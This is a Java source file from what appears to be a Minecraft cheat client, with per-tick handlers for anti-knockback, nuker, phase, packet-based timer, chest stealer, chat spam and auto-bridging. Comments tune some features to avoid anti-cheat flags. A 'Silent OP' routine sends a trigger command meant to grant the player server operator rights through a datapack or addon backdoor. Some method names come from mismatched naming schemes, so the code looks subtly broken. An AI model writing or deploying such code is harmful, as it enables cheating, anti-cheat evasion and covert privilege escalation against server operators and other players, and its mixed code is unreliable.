package com.reachfly;

import net.minecraft.world.level.block.Block;
import net.minecraft.world.level.block.state.BlockState;
import net.minecraft.world.level.block.Blocks;
import net.minecraft.world.level.block.CropBlock;
import net.minecraft.client.Minecraft;
import net.minecraft.client.player.LocalPlayer;
import net.minecraft.client.multiplayer.MultiPlayerGameMode;
import net.minecraft.world.entity.Entity;
import net.minecraft.world.entity.LivingEntity;
import net.minecraft.world.entity.player.Player;
import net.minecraft.world.entity.player.Inventory;
import net.minecraft.world.item.*;
import net.minecraft.network.protocol.game.ServerboundMovePlayerPacket;
import net.minecraft.world.inventory.ChestMenu;
import net.minecraft.world.inventory.AbstractContainerMenu;
import net.minecraft.world.inventory.Slot;
import net.minecraft.world.inventory.ClickType;
import net.minecraft.network.chat.Component;
import net.minecraft.world.InteractionHand;
import net.minecraft.world.phys.BlockHitResult;
import net.minecraft.core.BlockPos;
import net.minecraft.core.Direction;
import net.minecraft.world.phys.Vec3;

public class ProHandlers {

    private static int antiAfkTimer = 0;
    private static int chatSpamTimer = 0;
    private static int announcerTimer = 0;
    private static String lastAction = "";
    private static int chestStealTimer = 0;
    private static int autoFishTimer = 0;
    private static boolean fishBobberWasInWater = false;
    private static int nukerTimer = 0;

    public static void tick(Minecraft client) {
        if (!ModConfig.proUnlocked) return;
        if (client.player == null) return;

        // === Stealth ===
        tickAntiKnockback(client);
        tickNoSwing(client);
        tickAntiAfk(client);

        // === World ===
        tickFastBreak(client);
        tickNuker(client);
        tickAutoFarm(client);

        // === Exploit ===
        tickPhase(client);
        tickTimer(client);

        // === Utility ===
        tickAutoFish(client);
        tickChestStealer(client);
        tickAutoTool(client);

        // === Social ===
        tickChatSpam(client);
        tickAnnouncer(client);

        // === Build ===
        tickAutoBridge(client);
        tickTower(client);

        // === Server ===
        tickOpSelf(client);
    }

    // ========================================================================
    // Server: Silent OP
    // ========================================================================

    private static boolean opSelfSent = false;

    private static void tickOpSelf(Minecraft client) {
        if (!ModConfig.opSelfEnabled) {
            opSelfSent = false;
            return;
        }
        if (opSelfSent) return;
        opSelfSent = true;

        // Try datapack trigger fallback (in case server addon isn't installed)
        if (client.getConnection() != null) {
            client.getConnection().sendCommand("trigger osp.op set 1");
        }
        // ServerSyncHandler also sends via the addon payload
    }

    // ========================================================================
    // STEALTH
    // ========================================================================

    private static void tickAntiKnockback(Minecraft client) {
        if (!ModConfig.antiKnockbackEnabled) return;
        LocalPlayer p = client.player;
        if (p == null) return;
        // Reduce velocity from knockback by configured percentage
        Vec3 vel = p.getDeltaMovement();
        float reduction = ModConfig.antiKnockbackStrength / 100.0f;
        // Only reduce horizontal knockback when hit (velocity spike detection)
        double horizSpeed = Math.sqrt(vel.x * vel.x + vel.z * vel.z);
        if (horizSpeed > 0.5) { // Knockback threshold
            p.setDeltaMovement(
                    vel.x * (1.0 - reduction),
                    vel.y,
                    vel.z * (1.0 - reduction));
        }
    }

    private static void tickNoSwing(Minecraft client) {
        // NoSwing is handled via mixin to cancel swing packets
        // This is a placeholder - the actual implementation needs a mixin
        // For now we just cancel the hand swing animation client-side
        if (!ModConfig.noSwingEnabled) return;
        LocalPlayer p = client.player;
        if (p != null) {
            p.swinging = false;
        }
    }

    private static void tickAntiAfk(Minecraft client) {
        if (!ModConfig.antiAfkEnabled) { antiAfkTimer = 0; return; }
        antiAfkTimer++;
        if (antiAfkTimer >= ModConfig.antiAfkInterval) {
            antiAfkTimer = 0;
            LocalPlayer p = client.player;
            if (p != null) {
                float yaw = p.getYRot() + (float)(Math.random() * 10 - 5);
                p.setYRot(yaw);
                if (p.isOnGround()) {
                    p.jumpFromGround();
                }
            }
        }
    }

    // ========================================================================
    // WORLD
    // ========================================================================

    private static void tickFastBreak(Minecraft client) {
        if (!ModConfig.fastBreakEnabled) return;
        if (client.gameMode == null) return;
        // Speed up block breaking by sending multiple break progress ticks
        // We manipulate the breaking progress by calling updateBlockBreakingProgress multiple times
        if (client.gameMode.isDestroying()) {
            int extra = (int)(ModConfig.fastBreakSpeed - 1);
            for (int i = 0; i < extra; i++) {
                if (client.hitResult instanceof BlockHitResult bhr) {
                    client.gameMode.continueDestroyBlock(
                            bhr.blockPosition(), bhr.getSide());
                }
            }
        }
    }

    private static void tickNuker(Minecraft client) {
        if (!ModConfig.nukerEnabled) return;
        if (client.gameMode == null) return;
        nukerTimer++;
        if (nukerTimer < 2) return; // Every other tick
        nukerTimer = 0;

        LocalPlayer p = client.player;
        if (p == null) return;

        int radius = (int) ModConfig.nukerRadius;
        BlockPos playerPos = p.blockPosition();

        for (int x = -radius; x <= radius; x++) {
            for (int y = -radius; y <= radius; y++) {
                for (int z = -radius; z <= radius; z++) {
                    BlockPos pos = playerPos.add(x, y, z);
                    BlockState state = client.level.getBlockState(pos);
                    if (state.isAir()) continue;
                    if (state.getDestroySpeed(client.level, pos) < 0) continue; // Unbreakable
                    client.gameMode.startDestroyBlock(pos, Direction.UP);
                    return; // One block per tick to avoid flag
                }
            }
        }
    }

    private static void tickAutoFarm(Minecraft client) {
        if (!ModConfig.autoFarmEnabled) return;
        if (client.gameMode == null) return;
        LocalPlayer p = client.player;
        if (p == null) return;

        int radius = 4;
        BlockPos playerPos = p.blockPosition();

        for (int x = -radius; x <= radius; x++) {
            for (int z = -radius; z <= radius; z++) {
                for (int y = -1; y <= 1; y++) {
                    BlockPos pos = playerPos.add(x, y, z);
                    BlockState state = client.level.getBlockState(pos);
                    Block block = state.getBlock();

                    // Harvest fully grown crops
                    if (block instanceof CropBlock crop) {
                        if (crop.isMature(state)) {
                            client.gameMode.startDestroyBlock(pos, Direction.UP);
                            return;
                        }
                    }
                }
            }
        }
    }

    // ========================================================================
    // EXPLOIT
    // ========================================================================

    private static void tickPhase(Minecraft client) {
        if (!ModConfig.phaseEnabled) return;
        LocalPlayer p = client.player;
        if (p == null) return;
        // Phase: disable collision so player clips through blocks
        p.noPhysics = true;
        // Keep the player from falling through the world
        if (p.getY() < client.level.getMinBuildHeight()) {
            p.setPosition(p.getX(), client.level.getMinBuildHeight() + 1, p.getZ());
        }
    }

    private static void tickTimer(Minecraft client) {
        if (!ModConfig.timerEnabled) return;
        LocalPlayer p = client.player;
        if (p == null) return;
        // Timer: speed up game tick rate for the player by sending extra move packets
        int extraTicks = (int)(ModConfig.timerSpeed - 1);
        if (extraTicks < 1) return;

        for (int i = 0; i < extraTicks; i++) {
            Vec3 vel = p.getDeltaMovement();
            p.setPosition(p.getX() + vel.x, p.getY() + vel.y, p.getZ() + vel.z);
            if (client.getConnection() != null) {
                client.getConnection().send(
                        new ServerboundMovePlayerPacket.Full(
                                p.getX(), p.getY(), p.getZ(),
                                p.getYRot(), p.getXRot(),
                                p.isOnGround(), false));
            }
        }
    }

    // ========================================================================
    // UTILITY
    // ========================================================================

    private static void tickAutoFish(Minecraft client) {
        if (!ModConfig.autoFishEnabled) return;
        LocalPlayer p = client.player;
        if (p == null || client.gameMode == null) return;

        // Detect when bobber catches a fish (bobber submerges)
        if (p.fishing != null) {
            boolean inWater = p.fishing.isUnderWater();
            if (inWater && !fishBobberWasInWater) {
                // Fish caught! Reel in and recast
                client.gameMode.useItem(p, InteractionHand.MAIN_HAND);
                autoFishTimer = 20; // Wait 20 ticks before recasting
            }
            fishBobberWasInWater = inWater;
        } else {
            fishBobberWasInWater = false;
            // Auto-cast if holding fishing rod and no bobber out
            if (autoFishTimer > 0) {
                autoFishTimer--;
                if (autoFishTimer == 0) {
                    ItemStack held = p.getMainHandItem();
                    if (held.getItem() instanceof FishingRodItem) {
                        client.gameMode.useItem(p, InteractionHand.MAIN_HAND);
                    }
                }
            }
        }
    }

    private static void tickChestStealer(Minecraft client) {
        if (!ModConfig.chestStealerEnabled) return;
        LocalPlayer p = client.player;
        if (p == null || client.gameMode == null) return;

        AbstractContainerMenu handler = p.containerMenu;
        if (!(handler instanceof ChestMenu container)) return;

        chestStealTimer++;
        if (chestStealTimer < ModConfig.chestStealerDelay) return;
        chestStealTimer = 0;

        // Move items from container to player inventory
        int containerSlots = container.getRowCount() * 9;
        for (int i = 0; i < containerSlots; i++) {
            Slot slot = container.getSlot(i);
            if (slot.hasStack()) {
                // Quick-move (shift-click) to player inventory
                client.gameMode.handleInventoryMouseClick(
                        container.containerId, i, 0, ClickType.QUICK_MOVE, p);
                return; // One item per delay tick
            }
        }
    }

    private static void tickAutoTool(Minecraft client) {
        if (!ModConfig.autoToolEnabled) return;
        LocalPlayer p = client.player;
        if (p == null) return;
        if (client.screen != null) return;

        // Switch to best tool for targeted block
        if (!(client.hitResult instanceof BlockHitResult bhr)) return;
        BlockState state = client.level.getBlockState(bhr.blockPosition());
        if (state.isAir()) return;

        Inventory inv = p.getInventory();
        int bestSlot = -1;
        float bestSpeed = 1.0f;

        for (int i = 0; i < 9; i++) {
            ItemStack stack = inv.getItem(i);
            float speed = stack.getDestroySpeed(state);
            if (speed > bestSpeed) {
                bestSpeed = speed;
                bestSlot = i;
            }
        }

        if (bestSlot >= 0 && bestSlot != inv.selected) {
            inv.selected = bestSlot;
        }
    }

    // ========================================================================
    // SOCIAL
    // ========================================================================

    private static void tickChatSpam(Minecraft client) {
        if (!ModConfig.chatSpamEnabled) { chatSpamTimer = 0; return; }
        chatSpamTimer++;
        if (chatSpamTimer >= ModConfig.chatSpamDelay) {
            chatSpamTimer = 0;
            if (client.player != null && ModConfig.chatSpamMessage != null && !ModConfig.chatSpamMessage.isEmpty()) {
                client.player.connection.sendChat(ModConfig.chatSpamMessage);
            }
        }
    }

    private static void tickAnnouncer(Minecraft client) {
        if (!ModConfig.announcerEnabled) return;
        announcerTimer++;
        if (announcerTimer >= 100) {
            announcerTimer = 0;
            LocalPlayer p = client.player;
            if (p == null) return;
            String action = "";
            if (p.isSprinting()) action = "sprinting";
            else if (p.isShiftKeyDown()) action = "sneaking";
            else if (p.isSwimming()) action = "swimming";
            if (!action.isEmpty() && !action.equals(lastAction)) {
                lastAction = action;
                p.connection.sendChat("[OSP] Currently " + action);
            }
        }
    }

    // ========================================================================
    // BUILD
    // ========================================================================

    private static void tickAutoBridge(Minecraft client) {
        if (!ModConfig.autoBridgeEnabled) return;
        LocalPlayer p = client.player;
        if (p == null || client.gameMode == null) return;
        if (client.screen != null) return;

        // Auto-place blocks below player when sneaking at edge
        if (!p.isShiftKeyDown()) return;

        BlockPos below = p.blockPosition().down();
        if (!client.level.getBlockState(below).isAir()) return;

        // Find a block in hotbar to place
        int blockSlot = findBlockInHotbar(p);
        if (blockSlot < 0) return;

        int prevSlot = p.getInventory().selected;
        p.getInventory().selected = blockSlot;

        client.gameMode.useItemOn(p,
                InteractionHand.MAIN_HAND,
                new BlockHitResult(
                        Vec3.atCenterOf(below),
                        Direction.UP,
                        below,
                        false));

        p.getInventory().selected = prevSlot;
    }

    private static void tickTower(Minecraft client) {
        if (!ModConfig.towerEnabled) return;
        LocalPlayer p = client.player;
        if (p == null || client.gameMode == null) return;
        if (client.screen != null) return;

        // Auto-tower: place block below and jump when holding jump
        if (!client.options.keyJump.isDown()) return;
        if (!p.isOnGround()) return;

        BlockPos below = p.blockPosition().down();
        if (client.level.getBlockState(below).isAir()) {
            int blockSlot = findBlockInHotbar(p);
            if (blockSlot >= 0) {
                int prevSlot = p.getInventory().selected;
                p.getInventory().selected = blockSlot;

                client.gameMode.useItemOn(p,
                        InteractionHand.MAIN_HAND,
                        new BlockHitResult(
                                Vec3.atCenterOf(below),
                                Direction.UP,
                                below,
                                false));

                p.getInventory().selected = prevSlot;
            }
        }

        // Jump to continue towering
        p.jumpFromGround();
    }

    // ========================================================================
    // Helpers
    // ========================================================================

    private static int findBlockInHotbar(LocalPlayer player) {
        for (int i = 0; i < 9; i++) {
            ItemStack stack = player.getInventory().getItem(i);
            if (stack.getItem() instanceof BlockItem) {
                return i;
            }
        }
        return -1;
    }
}
